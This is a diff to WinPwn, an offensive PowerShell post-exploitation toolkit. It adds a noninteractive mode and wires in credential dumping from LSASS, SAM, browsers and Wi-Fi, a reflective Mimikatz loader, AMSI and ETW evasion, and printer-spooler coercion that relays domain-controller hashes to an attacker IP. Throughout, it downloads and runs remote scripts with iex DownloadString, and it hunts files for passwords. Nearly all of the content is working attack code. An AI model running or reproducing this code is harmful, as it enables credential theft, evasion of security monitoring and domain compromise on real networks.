                                   
@@ -1171,7 +1384,7 @@ g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             cmd /c start powershell -Command "$currentPath\passhunt.exe -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
         }
 
@@ -1186,7 +1399,14 @@ function domainreconmodules
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
-            #Domain / Network Reconing
+    #Domain / Network Recon
+        [CmdletBinding()]
+
+    Param
+    (   
+        [Switch]
+        $noninteractive
+    )
 
 
  function generaldomaininfo{
@@ -1263,40 +1483,11 @@ function domainreconmodules
 	        rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        }
             
-	    
-            function spoolvulnscan{
+
+
             
-	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
-                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/SpoolerScanner/master/SpoolerScan.ps1')
-                    $domcontrols = spinster
-                    foreach ($domc in $domcontrols.IPAddress)
-                    {
-		    	try{
-                        if (spoolscan -target $domc)
-                        {
-                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
-                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
-                        }
-			}catch{Write-Host "Got an error"}
-                    }
-		    $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
-            	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
-                    {
-		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
-		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-			foreach ($acserver in $ActiveServers.dnshostname)
-                    	{
-				try{
-                        	if (spoolscan -target $acserver)
-                        	{
-                            		Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now'
-                            		echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
-                        	}
-				}catch{Write-Host "Got an error"}
-                    	}
-            }
                     
-	        }
+	        
 	                    pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     
@@ -1313,6 +1504,23 @@ __        ___       ____
    --> Domainreconmodules
 
 '@
+    if ($noninteractive)
+    {
+        reconAD 
+        sharphound 
+        Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
+        shareenumeration
+        powerSQL -noninteractive
+        MS17-10 -noninteractive
+        passhunt -domain $true
+        GPOAudit
+        spoolvulnscan -noninteractive
+        bluekeep -noninteractive
+        printercheck -noninteractive
+        RBCD-Check -noninteractive
+        GPORemoteAccessPolicy -noninteractive
+        return;
+    }
     
     do
     {
@@ -1364,34 +1572,139 @@ __        ___       ____
  While ($masterquestion -ne 19)
 }
 
+function spoolvulnscan
+{
+
+    [CmdletBinding()]
+
+    Param
+    (   
+        [Switch]
+        $noninteractive
+    )   
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')         
+	    Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/SpoolerScanner/master/SpoolerScan.ps1')
+        $domcontrols = spinster
+        foreach ($domc in $domcontrols.IPAddress)
+        {
+		   	try{
+                   if (spoolscan -target $domc)
+                   {
+                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
+                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
+                   }
+			   }
+               catch
+               {
+                    Write-Host "Got an error"
+               }
+        }
+        $othersystems = "no"
+		if (!$noninteractive)
+        {
+            $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
+        }
+        if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
+        {
+		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
+		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
+		    	foreach ($acserver in $ActiveServers.dnshostname)
+                {
+				    try{
+                        	if (spoolscan -target $acserver)
+                        	{
+                            		Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now"
+                            		echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
+                        	}
+				        }catch{Write-Host "Got an error"}
+                }
+        }
+        if (!$noninteractive)
+        {
+             Write-Host -ForegroundColor Yellow "Relay hashes from all vulnerable servers?"
+             $answer = Read-Host
+        }
+        else
+        {$answer = "no"}
+        if ($answer)
+        {
+                  Write-Host -ForegroundColor Yellow "Please enter the hash capturing IP-Adress:"
+                  $captureip = Read-Host
+                  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Spoolsample.ps1')
+                  if (test-path "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt")
+                  {
+                          $servers = get-content "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
+                          foreach ($server in $servers)
+                          {
+                                Write-Host -ForegroundColor Yellow "Spool sampling $server"
+                                Invoke-SpoolSample -command "$server $captureip"
+                          }
+                      }
+                      if (test-path "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt")
+                      {
+                          $servers = get-content "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
+                          foreach ($server in $servers)
+                          {
+                                Write-Host -ForegroundColor Yellow "Spool sampling $server"
+                                Invoke-SpoolSample -command "$server $captureip"
+                          }
+                      }
+        }
+}
+                    
+
 function GPORemoteAccessPolicy
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpGPO-RemoteAccessPolicies.ps1')
     Invoke-SharpGPO-RemoteAccessPolicies >> $currentPath\DomainRecon\GPO-RemoteAccess.txt
-    Get-Content $currentPath\DomainRecon\GPO-RemoteAccess.txt
-    pause;
+    if (!$noninteractive)
+    {
+        Get-Content $currentPath\DomainRecon\GPO-RemoteAccess.txt
+        pause;
+    }
 }
 function RBCD-Check
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Get-RBCD-Threaded.ps1')
     $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
     Invoke-Get-RBCD-Threaded -Command "-s -d $Domain" >> $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
-    Get-Content $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
-    pause;
+    if (!$noninteractive)
+    {
+        Get-Content $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
+        pause;
+    }
 }
 
 function printercheck
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpPrinter.ps1')
     Invoke-SharpPrinter >> $currentPath\DomainRecon\printercheck.txt
-    Get-Content $currentPath\DomainRecon\printercheck.txt
-    pause;
+    if($noninteractive){
+        Get-Content $currentPath\DomainRecon\printercheck.txt
+        pause;
+    }
 }
 function GPOAudit
 {
@@ -1427,11 +1740,18 @@ function bluekeep
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement / Exploitation Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
+
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/bluekeepscan.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
-    $serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'
+    $serversystems = "yes"
+    if (!$noninteractive){$serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'}
     if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
     {
 	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
@@ -1494,11 +1814,20 @@ function MS17-10
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement / Exploitation Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ms17-10.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
-    $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
+    $serversystems = "yes"
+    if(!$noninteractive)
+    {
+        $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
+    }
     if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
     {
 	    if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
@@ -1561,6 +1890,11 @@ function powerSQL
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
@@ -1586,7 +1920,8 @@ function powerSQL
     }
     Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
     move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
-    $uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'
+    $uncpath = "no"
+    if (!$noninteractive){$uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'}
     if ($uncpath -eq "yes" -or $uncpath -eq "y" -or $uncpath -eq "Yes" -or $uncpath -eq "Y")
     {
         $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network? (If not we can start inveigh) - (yes/no)'
@@ -1685,6 +2020,11 @@ function itm4nprivesc
 
 function otherchecks
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     
@@ -1798,15 +2138,33 @@ function otherchecks
     } Else {
         Write-Host "Looks good! No system path can be written to by the current user." -ForegroundColor Green
     }
+    Reg1c1de >> $currentPath\LocalPrivEsc\WritebleRegistryKeys.txt
 }
 
 function winPEAS
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
+
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
-    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' ''}'
+    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}
+    if ($noninteractive)
+    {
+        IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1')
+        Invoke-winPEAS -command ' ' >> $currentPath\LocalPrivEsc\winPEAS.txt
+    }
     REG DELETE HKCU\Console\ /v VirtualTerminalLevel /f
+}
+
+function Reg1c1de
+{
+	IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Reg1c1de.ps1')
+	Invoke-Reg1c1de
 }
 
 function privescmodules
@@ -1829,11 +2187,20 @@ __        ___       ____
    \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
    --> local Privilege Escalation checks
 '@
+        if($noninteractive)
+        {
+            itm4nprivesc
+            winPEAS
+            oldchecks
+            otherchecks
+            return
+        }
+
         
         do
         {
             Write-Host "================ WinPwn ================"
-            Write-Host -ForegroundColor Green '1. itm4n´s Invoke-PrivescCheck'
+            Write-Host -ForegroundColor Green '1. itm4ns Invoke-PrivescCheck'
             Write-Host -ForegroundColor Green '2. winPEAS! '
             Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
             Write-Host -ForegroundColor Green '4. All other checks! '
@@ -2370,6 +2737,18 @@ function fruit
 {
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
 }
+
+function mimiload
+{
+	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/loadmimi.ps1')
+	loadmimi
+}
+
+function BlockEtw
+{
+	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-BlockETW.ps1')
+	Invoke-BlockETW
+}
     
 function WinPwn
 {
@@ -2379,6 +2758,44 @@ function WinPwn
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
+         [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $Domainrecon,
+        [Switch]
+        $Localrecon,
+        [Switch]
+        $Privesc,
+        [Switch]
+        $PowerSharpPack,
+        [Switch]
+        $Uacbypass,
+        [string]
+        $command,
+        [string]
+        $technique,
+        [switch]
+        $credentialmanager,
+        [switch]
+        $mimikittie,
+        [switch]
+        $rundll32lsass,
+        [switch]
+        $lazagne,
+        [switch]
+        $browsercredentials,
+        [switch]
+        $mimikittenz,
+        [switch]
+        $wificredentials,
+        [switch]
+        $samdump,
+        [switch]
+        $sharpcloud   
+    )
+   
 @'
 
              
@@ -2393,6 +2810,72 @@ __        ___       ____
 '@
     dependencychecks
     AmsiBypass
+    BlockEtw
+    if ($noninteractive)
+    {
+        if ($Domainrecon)
+        {
+            domainreconmodules -noninteractive
+        }
+        if ($Localrecon)
+        {
+            localreconmodules -noninteractive
+        }
+        if ($Privesc)
+        {
+            privescmodules -noninteractive
+        }
+        if ($PowerSharpPack)
+        {
+            sharpcradle -allthosedotnet -noninteractive
+        }
+        if ($Uacbypass)
+        {
+            if ("ccmstp", "DiskCleanup", "magic" -notcontains $technique)
+            {
+                Write-Host "Invalid technique, choose from ccmstp DiskCleanup or magic"
+                return
+            }
+            UACBypass -noninteractive -command $command -technique $technique
+        }
+        if ($credentialmanager)
+        {
+            kittielocal -noninteractive -credentialmanager
+        }
+        if($mimikittie)
+        {
+            kittielocal -noninteractive -mimikittie
+        }
+        if($rundll32lsass)
+        {
+            kittielocal -noninteractive -rundll32lsass
+        }
+        if($lazagne)
+        {
+            kittielocal -noninteractive -lazagne
+        }
+        if($browsercredentials)
+        {
+            kittielocal -noninteractive -browsercredentials
+        }
+        if($mimikittenz)
+        {
+            kittielocal -noninteractive -mimikittenz
+        }
+        if($wificredentials)
+        {
+            kittielocal -noninteractive -wificredentials
+        }
+        if ($samdump)
+        {
+            kittielocal -noninteractive -samdump
+        }
+        if ($sharpcloud)
+        {
+            kittielocal -noninteractive -sharpcloud
+        } 
+        return;
+    }
 
     do
     {
@@ -2412,7 +2895,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
 	Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
 	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
-        Write-Host -ForegroundColor Green '16. Exit. '
+	Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
+        Write-Host -ForegroundColor Green '17. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2433,6 +2917,7 @@ __        ___       ____
             13{sharpcradle -allthosedotnet}
 	        14{sharpcradle -web}
             15{domainpassspray}
+	    16{mimiload}
         
     }
     }
